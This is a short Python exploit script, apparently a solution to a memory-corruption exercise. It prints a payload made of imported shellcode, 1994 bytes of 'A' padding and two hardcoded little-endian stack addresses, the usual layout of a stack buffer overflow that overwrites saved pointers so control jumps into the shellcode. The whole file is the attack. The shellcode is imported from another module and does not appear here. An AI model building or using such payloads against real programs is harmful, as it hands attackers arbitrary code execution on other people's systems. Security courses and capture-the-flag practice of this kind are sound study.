#!/usr/bin/env python3

import sys

from shellcode import shellcode

sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b'\x41'*1994)
sys.stdout.buffer.write(0x00007ffffff687c0.to_bytes(8, 'little'))
sys.stdout.buffer.write(0x00007ffffff68fd8.to_bytes(8, 'little'))